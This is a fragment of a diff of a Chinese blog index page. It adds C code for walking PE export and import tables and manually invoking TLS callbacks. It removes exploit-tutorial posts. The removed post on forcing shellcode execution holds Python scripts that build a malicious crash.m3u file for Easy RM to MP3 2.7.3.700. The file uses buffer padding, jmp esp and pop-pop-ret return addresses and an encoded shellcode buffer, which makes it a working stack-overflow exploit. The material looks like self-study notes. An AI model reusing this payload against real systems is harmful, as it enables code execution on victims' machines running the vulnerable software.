+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">//遍历导出表</span><br><span class="line">void TraExportTable(char* pFileBase)</span><br><span class="line">&#123;</span><br><span class="line">	//找到导出表</span><br><span class="line">	PIMAGE_DOS_HEADER pDos =</span><br><span class="line">		(PIMAGE_DOS_HEADER)pFileBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt =</span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFileBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pExportDir = </span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)&amp;pNt-&gt;OptionalHeader.DataDirectory[0];</span><br><span class="line">	//判断是否有导出表</span><br><span class="line">	if (!pExportDir-&gt;Size)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;没有导出表\n&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	//获取导出表的FOA</span><br><span class="line">	DWORD dwExportFOA = RVAtoFOA(pExportDir-&gt;VirtualAddress,</span><br><span class="line">		                 pFileBase);</span><br><span class="line">	//导出表再文件中的位置</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportTable = </span><br><span class="line">		        (PIMAGE_EXPORT_DIRECTORY)(dwExportFOA + pFileBase);</span><br><span class="line"></span><br><span class="line">	//打印名字</span><br><span class="line">	char* pFileName = </span><br><span class="line">		RVAtoFOA(pExportTable-&gt;Name, pFileBase) + pFileBase;</span><br><span class="line">	printf(&quot;模块名：%s\n&quot;, pFileName);</span><br><span class="line"></span><br><span class="line">	//获取函数地址表中元素个数</span><br><span class="line">	DWORD dwFunCount = pExportTable-&gt;NumberOfFunctions;</span><br><span class="line">	//获取函数名称表中元素个数</span><br><span class="line">	DWORD dwFunNameCount = pExportTable-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">	//地址表地址</span><br><span class="line">	PDWORD pAddress = </span><br><span class="line">		(PDWORD)(RVAtoFOA(pExportTable-&gt;AddressOfFunctions,pFileBase) + pFileBase);</span><br><span class="line">	//名称表地址</span><br><span class="line">	PDWORD pName =</span><br><span class="line">		(PDWORD)(RVAtoFOA(pExportTable-&gt;AddressOfNames, pFileBase) + pFileBase);</span><br><span class="line">	//序号表地址</span><br><span class="line">	PWORD pOrdinal =</span><br><span class="line">		(PWORD)(RVAtoFOA(pExportTable-&gt;AddressOfNameOrdinals, pFileBase) + pFileBase);</span><br><span class="line"></span><br><span class="line">	for (DWORD i = 0; i &lt; dwFunCount;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (pAddress[i] == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		//判断是否是名称导出</span><br><span class="line">		BOOL bFlag = FALSE;</span><br><span class="line">		for (DWORD n = 0; n &lt; dwFunNameCount;n++)</span><br><span class="line">		&#123;</span><br><span class="line">			if (i == pOrdinal[n])</span><br><span class="line">			&#123;</span><br><span class="line">				bFlag = TRUE;</span><br><span class="line">				//有名字就到名称表中找到名称的地址</span><br><span class="line">				char* pFunName = RVAtoFOA(pName[n], pFileBase) + pFileBase;</span><br><span class="line">				printf(&quot;函数名： %s函数序号：%d\n&quot;, pFunName, i + pExportTable-&gt;Base);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		//序号导出</span><br><span class="line">		if (!bFlag)</span><br><span class="line">		   printf(&quot;函数名：【NULL】函数序号：%d\n&quot;,  i + pExportTable-&gt;Base);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>导入表</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">//遍历导入表</span><br><span class="line">void TraImportTable(char* pFileBase)</span><br><span class="line">&#123;</span><br><span class="line">	//找到导出表</span><br><span class="line">	PIMAGE_DOS_HEADER pDos =</span><br><span class="line">		(PIMAGE_DOS_HEADER)pFileBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt =</span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFileBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pImportDir =</span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)&amp;pNt-&gt;OptionalHeader.DataDirectory[1];</span><br><span class="line">	//是否有导入表</span><br><span class="line">	if (pImportDir-&gt;Size == 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;没有导入表\n&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	//获取导入表再文件中的地址</span><br><span class="line">	DWORD dwFOA = RVAtoFOA(pImportDir-&gt;VirtualAddress, pFileBase);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImportTable = </span><br><span class="line">		         (PIMAGE_IMPORT_DESCRIPTOR)(dwFOA + pFileBase);</span><br><span class="line">	//以一个全0结构结尾</span><br><span class="line">	while (pImportTable-&gt;Name)</span><br><span class="line">	&#123;</span><br><span class="line">		//显示模块名</span><br><span class="line">		printf(&quot;模块名：%s\n&quot;,RVAtoFOA(pImportTable-&gt;Name, pFileBase) + pFileBase);</span><br><span class="line">		//通过OriginalFirstThunk（INT）或者FirstThunk（IAT）都可以便利到函数名</span><br><span class="line">		PIMAGE_THUNK_DATA pThunk = </span><br><span class="line">			(PIMAGE_THUNK_DATA)</span><br><span class="line">			(RVAtoFOA(pImportTable-&gt;FirstThunk, pFileBase) + pFileBase);</span><br><span class="line">		while (pThunk-&gt;u1.AddressOfData)</span><br><span class="line">		&#123;</span><br><span class="line">			//判断导入方式如果IMAGE_THUNK_DATA的最高位位0,说明是名称导入，否则就是序号导入</span><br><span class="line">			if (IMAGE_SNAP_BY_ORDINAL32(pThunk-&gt;u1.Ordinal))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;\t函数名：【NULL】 函数序号：%04X\n&quot;,</span><br><span class="line">					pThunk-&gt;u1.Ordinal &amp;&amp; 0xFFFF);</span><br><span class="line">			&#125;</span><br><span class="line">			else //名称导入</span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME pName =</span><br><span class="line">					(PIMAGE_IMPORT_BY_NAME)</span><br><span class="line">					(RVAtoFOA(pThunk-&gt;u1.AddressOfData, pFileBase) + pFileBase);</span><br><span class="line">				printf(&quot;\t函数名：%s 函数序号：%04X\n&quot;, pName-&gt;Name,</span><br><span class="line">					pName-&gt;Hint);</span><br><span class="line">			&#125;</span><br><span class="line">			//下一个函数</span><br><span class="line">			pThunk++;</span><br><span class="line">		&#125;</span><br><span class="line">		//下一个模块的导入信息</span><br><span class="line">		pImportTable++; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>手工调用TLS</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void RepairTLS(char *BaseAddr) &#123;</span><br><span class="line">	IMAGE_DATA_DIRECTORY * pDDir = GetOptionHeader(BaseAddr)-&gt;DataDirectory;</span><br><span class="line">	//压缩后将数据目录表的TLS修复</span><br><span class="line">	if (g_Sc.TlsDataDir.VirtualAddress!=0x0) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD oldProtect;</span><br><span class="line">		VirtualProtect(pDDir + 9, 8,PAGE_READWRITE,&amp;oldProtect);</span><br><span class="line">		memcpy(pDDir + 9, (void *)&amp;g_Sc.TlsDataDir, sizeof(IMAGE_DATA_DIRECTORY));</span><br><span class="line">		VirtualProtect(pDDir + 9, 8, oldProtect, &amp;oldProtect);</span><br><span class="line">		//手工调用原TLS函数</span><br><span class="line">		PIMAGE_TLS_DIRECTORY pTlsDir = (PIMAGE_TLS_DIRECTORY)((pDDir + 9)-&gt;VirtualAddress + BaseAddr);</span><br><span class="line">		PIMAGE_TLS_CALLBACK* lpTlsFun = (PIMAGE_TLS_CALLBACK*)(pTlsDir-&gt;AddressOfCallBacks);</span><br><span class="line">		while ((*lpTlsFun) != NULL) &#123; //判断是否有TLS回调函数</span><br><span class="line">			(*lpTlsFun)(BaseAddr, DLL_PROCESS_ATTACH, NULL);</span><br><span class="line">			lpTlsFun++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -722,7 +916,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
         		</li>
       		
 		</ul>
@@ -732,7 +926,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/逆向分析方法/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/PE文件编程/">展开全文 >></a>
         </p>
       
 
@@ -862,200 +1056,6 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-迫使shellcode执行方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/迫使shellcode执行方法/">exploit_2_迫使shellcode执行方法</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/迫使shellcode执行方法/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
-<p>跳转方法:</p>
-<ul>
-<li>jmp/call<br>如果有寄存器可以利用来跳转到shellcode,则可以使用该方法来进行跳转<br>例如:jmp esp/call esp</li>
-<li>pop retn/popad<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">popad 0x61</span><br><span class="line">pop eax 58</span><br><span class="line">pop ebx 5b</span><br><span class="line">pop ecx 59</span><br><span class="line">pop edx 5a</span><br><span class="line">pop esi 5e</span><br><span class="line">pop ebp 5d</span><br><span class="line">retn    C3</span><br><span class="line"></span><br><span class="line">python 脚本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #eip pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x31\xae\x80\x7c&quot; ) #eip jmp esp</span><br><span class="line">    f.write(&quot;\x90&quot; * 25) #必须 如果确实这些会shellcode会执行错误</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>当缓冲区起始于栈顶下方时,可以使用一系列的POP指令和RET指令,来使字节弹出zhan,ESP指针越来越接近shellcode,当最后执行RET会将shellcode地址压入EIP</p>
-<ul>
-<li><p>push return</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">push esp 54</span><br><span class="line">retn     C3</span><br><span class="line"></span><br><span class="line">当寄存器指向shellcode,但是没有jump Reg/call Reg,则可以通过push Reg</span><br><span class="line">retn</span><br><span class="line">由于retn会将Reg的内容压入Eip</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) #pop pop retn</span><br><span class="line">    f.write(&quot;\x90&quot; *4 ) #retn4</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; * 6)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x72\x1E\x81\x7c&quot; ) #eip push esp retn</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>jmp [reg + offset]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寄存器指向包含shellcode地址的缓冲区,但是没有指向入口,通过指向</span><br><span class="line">jmp [Reg+offset]跳转到入口</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>SHE<br>通过自己的地址去覆盖SHE,迫使跳转至shellcode,但是需要处理safeShe以及SHEOP</p>
-</li>
-<li><p>应对狭窄型缓冲区<br>利用跳转指令跳至任意地址</p>
-</li>
-<li><p>short jumps/conditional jumps</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 0xeb</span><br><span class="line"></span><br><span class="line">条件跳转:</span><br><span class="line">根据EFLAGS寄存器的状态来实现跳转</span><br></pre></td></tr></table></figure></li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/迫使shellcode执行方法/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-exploit_3_基于SEH的exploit_1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/exploit_3_基于SEH的exploit_1/">exploit_3_基于SEH的exploit_1</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/exploit_3_基于SEH的exploit_1/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>实验版本:<br>windows sp2<br>soritong mp3 player 1.0<br>ollydbg</p>
-<blockquote>
-<p>基础知识</p>
-</blockquote>
-<p>在xp sp1后S添加了GS/DEP/SafeSEH以及其他保护机制</p>
-<ul>
-<li>Xor<br>在调用异常处理例程之前,所有的寄存器都会先被清空</li>
-<li><p>Dep&amp;Stack Cookies</p>
-</li>
-<li><p>SafeSEH<br>新增一些额外保护,禁止非法的SEH覆盖</p>
-</li>
-<li><p>Windows 2003</p>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/exploit_3_基于SEH的exploit_1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
@@ -1149,7 +1149,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内核编程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1157,7 +1169,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1169,7 +1181,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
